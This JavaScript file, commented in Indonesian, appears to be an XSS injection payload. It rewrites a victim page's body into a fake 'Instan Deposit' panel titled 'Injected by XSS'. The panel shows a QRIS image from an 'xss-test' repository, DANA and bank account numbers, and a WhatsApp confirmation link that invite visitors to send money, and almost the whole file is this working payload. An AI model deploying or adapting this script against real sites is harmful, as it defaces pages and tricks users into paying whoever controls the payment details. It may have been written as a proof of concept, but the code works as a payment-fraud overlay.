// Buat ulang struktur HTML dari JavaScript
document.body.innerHTML = `
  <div class="bg-white shadow-2xl rounded-2xl w-full max-w-xl p-8 space-y-8" style="margin:auto;margin-top:30px">
    <h1 class="text-3xl font-bold text-center text-indigo-700 mb-4">Instan Deposit (Injected by XSS)</h1>
    <!-- QRIS Deposit -->
    <div class="p-4 bg-indigo-50 rounded-xl shadow">
      <h2 class="text-xl font-semibold mb-2 text-indigo-600">Deposit via QRIS</h2>
      <label class="block mb-2 text-sm font-medium">Masukkan Username:</label>
      <input id="qrisInput" type="text" placeholder="Ketik username kamu..." class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-400">
      <div id="qrisSection" class="mt-4 flex flex-col items-center">
        <img id="qrisImage" src="https://github.com/mnazmi2125/xss-test/raw/0258a931219d83430e979872c2f049719d188cda/qris-manual%20oei.jpg" alt="QRIS" class="mb-2 shadow-lg rounded-xl" style="width: 200px; height: 200px; object-fit: contain;">
        <span class="text-xs text-gray-500">Scan QRIS ini untuk deposit instan ke akun kamu!</span>
      </div>
    </div>
    <!-- Deposit via DANA/Banking -->
    <div class="p-4 bg-indigo-50 rounded-xl shadow">
      <h2 class="text-xl font-semibold mb-2 text-indigo-600">Deposit via DANA / Banking</h2>
      <label class="block mb-2 text-sm font-medium">Nominal Deposit (Rp):</label>
      <input id="nominalInput" type="text" class="w-full p-2 border rounded mb-2 focus:outline-none focus:ring-2 focus:ring-indigo-400">
      <div class="text-sm text-gray-600 mb-4">Minimal Deposit Rp50.000</div>
      <div class="mb-2">
        <div class="font-semibold">No. DANA:</div>
        <span class="text-blue-700 font-mono text-lg">0812-3456-7890</span>
      </div>
      <div class="mb-2">
        <div class="font-semibold">No. Rekening Bank:</div>
        <span class="text-green-700 font-mono text-lg">1234 (BCA)</span>
      </div>
      <div class="text-xs text-gray-500 mb-4">*Transfer sesuai nominal di atas, lalu konfirmasi via WhatsApp admin jika perlu.</div>
      <div class="flex gap-4">
        <button id="btnOke" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded shadow transition">OKE</button>
        <a href="https://wa.me/6281234567890" target="_blank"
           class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded shadow transition flex items-center gap-1">
          KONFIRMASI LIVECHAT
        </a>
      </div>
      <div id="notifProses" class="hidden fade-in mt-4 bg-yellow-100 text-yellow-800 px-4 py-2 rounded shadow text-center font-semibold">
        Deposit diproses...
      </div>
    </div>
  </div>
`;

// Tambahkan Tailwind (dengan menambah tag script ke head)
if (!document.querySelector('script[src*="cdn.tailwindcss.com"]')) {
  var tw = document.createElement('script');
  tw.src = "https://cdn.tailwindcss.com";
  document.head.appendChild(tw);
}

// Animasi dan fungsi button
setTimeout(() => {
  // OKE Button
  const btnOke = document.getElementById('btnOke');
  const notifProses = document.getElementById('notifProses');
  if(btnOke && notifProses) {
    btnOke.addEventListener('click', function() {
      notifProses.classList.remove('hidden');
      notifProses.classList.add('fade-in');
      setTimeout(() => notifProses.classList.remove('fade-in'), 900);
    });
  }

  // Fungsi format ke rupiah
  function formatRupiah(angka, prefix){
    let number_string = angka.replace(/[^,\d]/g, '').toString(),
        split    = number_string.split(','),
        sisa     = split[0].length % 3,
        rupiah   = split[0].substr(0, sisa),
        ribuan   = split[0].substr(sisa).match(/\d{3}/gi);
    if(ribuan){
      let separator = sisa ? '.' : '';
      rupiah += separator + ribuan.join('.');
    }
    rupiah = split[1] !== undefined ? rupiah + ',' + split[1] : rupiah;
    return prefix === undefined ? rupiah : (rupiah ? 'Rp ' + rupiah : '');
  }

  const nominalInput = document.getElementById('nominalInput');
  if (nominalInput) {
    nominalInput.addEventListener('input', function(e){
      let value = nominalInput.value;
      nominalInput.value = formatRupiah(value, 'Rp ');
    });
  }
}, 1000); // delay biar tailwind sudah load

// Tambahkan style CSS ke <head>
const style = document.createElement('style');
style.innerHTML = `
  .hidden { display: none; }
  .fade-in { animation: fadeIn 0.8s; }
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px);}
    to   { opacity: 1; transform: translateY(0);}
  }
`;
document.head.appendChild(style);
